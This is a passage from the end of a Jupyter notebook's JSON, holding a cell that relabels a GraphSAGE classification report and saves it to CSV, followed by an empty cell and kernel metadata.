    "output_path = \"./result/GraphSAGE_emb256\"\n",
    "if not os.path.isdir(output_path):\n",
    "    os.makedirs(output_path)\n",
    "    \n",
    "report_df.reset_index(inplace=True, names='label')\n",
    "\n",
    "label_list = []\n",
    "for idx, row in report_df.iterrows():\n",
    "    if row[\"label\"].isdigit():\n",
    "        row[\"label\"] = index2label[int(row[\"label\"])]\n",
    "    label_list.append(row[\"label\"])\n",
    "report_df[\"label\"] = label_list\n",
    "\n",
    "report_df.to_csv(f'{output_path}/result.csv', index=False)\n",
    "print(\"report output at: \", f'{output_path}/result.csv')\n",
    "\n",
    "report_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b5eeca21-1da7-42d2-8306-950bb6490fd3",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
